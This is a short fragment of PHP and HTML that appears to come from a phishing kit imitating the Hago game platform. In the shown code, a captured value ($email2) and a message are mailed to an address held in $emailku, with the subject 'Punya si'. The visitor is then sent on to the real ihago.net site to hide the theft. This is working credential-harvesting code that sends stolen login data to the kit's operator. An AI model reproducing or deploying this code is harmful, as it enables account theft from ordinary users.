...
include 'email.php';
$subject = "Punya si [ ".$email2." ]";
$headers = "From: 𝕻𝖚𝖑𝖇𝖊𝖗𝕬𝖏𝖆 ᴀᴋᴜɴ ʜᴀɢᴏ <Pulberaja.hago>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
'<script>window.location.replace("https://ihago.net/m/")</script>';}
}
?>
<!-- ADHAN TAMVAN  !! -->
...
<div style="width:100%" class="form-group">
  ...
  <a  href="https://ihago.net/m/" class="btn btn-block" style="color: #F8F8FF;background-color: #000000;" id="gsubmit"> LOGOUT </a>			
